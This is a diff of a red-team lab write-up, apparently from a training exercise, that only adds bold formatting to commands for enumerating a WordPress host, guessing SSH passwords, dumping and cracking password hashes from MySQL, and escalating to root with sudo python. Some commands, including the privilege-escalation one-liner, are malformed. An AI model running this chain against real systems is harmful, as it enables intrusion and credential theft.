@@ -10,7 +10,7 @@
 
 Nmap scan results for each machine reveal the below services and OS details:
 
-- $ nmap -sV -A 192.168.1.100
+- **$ nmap -sV -A 192.168.1.100**
 
 ![NMAP scan](https://user-images.githubusercontent.com/88005785/156202449-00d3d6a3-2b1a-4f3a-b20a-a435e417e40d.png)
 
@@ -37,15 +37,15 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
 - Exploit Used
   - WPScan was used to enumerate users on the WordPress site
-  - $ wpscan --url http://192.168.1.110/Wordpress --enumerate u
+  - **$ wpscan --url http://192.168.1.110/Wordpress --enumerate u**
 
 ![Enumeration](https://user-images.githubusercontent.com/88005785/156202666-bda80739-4b50-4319-b4cf-50c57ec610d7.png)
 
   - After enumerating users, guessed user Michael’s password: michael
   - Connected via SSH using Michael’s credentials.
-    - $ ssh michael@192.168.1.110 
+    - **$ ssh michael@192.168.1.110 **
   - Found first flag in /var/www/html/service.html directory and file by using following command:
-    - $ grep -ir flag1 /var/www 
+    - **$ grep -ir flag1 /var/www **
 
 ![Flag1](https://user-images.githubusercontent.com/88005785/156202721-05f782ae-8cb3-4adb-9fc1-d21f3123007e.png)
 
@@ -65,24 +65,24 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 ![SQL creds](https://user-images.githubusercontent.com/88005785/156202822-3cd279e0-70bb-44e9-843a-3f4a550d4ae5.png)
 
   - Logged into mysql with following command
-    - $ mysql -u root - p wordpress
+    - **$ mysql -u root - p wordpress**
   - Ran the following sql commands to enumerate the tables:
-    - show databases;
-    - use wordpress;
-    - show tables;
+    - **show databases;**
+    - **use wordpress;**
+    - **show tables;**
 
 ![mysql table](https://user-images.githubusercontent.com/88005785/156202856-bb8acbbf-d34a-4243-97b7-cb9faf1643eb.png)
 
-    - select * from wp_posts;
+    - **select * from wp_posts;**
 
 ![Flag3](https://user-images.githubusercontent.com/88005785/156202875-8cdb60ff-32a1-4184-a169-831b859b311f.png)
 
-    - select * from wp_users;
+    - **select * from wp_users;**
 
 ![Hashed passwords](https://user-images.githubusercontent.com/88005785/156202901-b6ed3cce-eb4c-4b72-83b5-1daec9a720f2.png)
 
   - On the Kali machine, the hashed passwords (displayed above) were cracked using John the Ripper:
-    - $ john wp_hashes.txt
+    - **$ john wp_hashes.txt**
 
 ![Steve password](https://user-images.githubusercontent.com/88005785/156202935-5679ae4c-b1a8-44df-b7f3-466fecc21307.png)
  
@@ -92,18 +92,18 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
 - Exploit Used
   - Connected via SSH using Steven’s credentials
-    - $ ssh steven@192.168.1.110
+    - **$ ssh steven@192.168.1.110**
 
 
 ![Steve account](https://user-images.githubusercontent.com/88005785/156202989-707e992c-a101-4e93-a0bf-027324c44e54.png)
 
   - Attempted to switch to root by enumerating sudo privileges:
-    - $ sudo -l
+    - **$ sudo -l**
 
 ![Steve sudo](https://user-images.githubusercontent.com/88005785/156203026-4eecaabe-b699-4925-a3bc-5c5c54f20439.png)
 
   - Escalated to root by using the following python command:
-    - $ sudo python -c ‘import pty: pty.spawn(*/bin/sh”)’
+    - **$ sudo python -c ‘import pty: pty.spawn(*/bin/sh”)’**
 
 ![Python command](https://user-images.githubusercontent.com/88005785/156203052-3e079f95-1c0b-4419-9a0e-6c9b64108019.png)
 
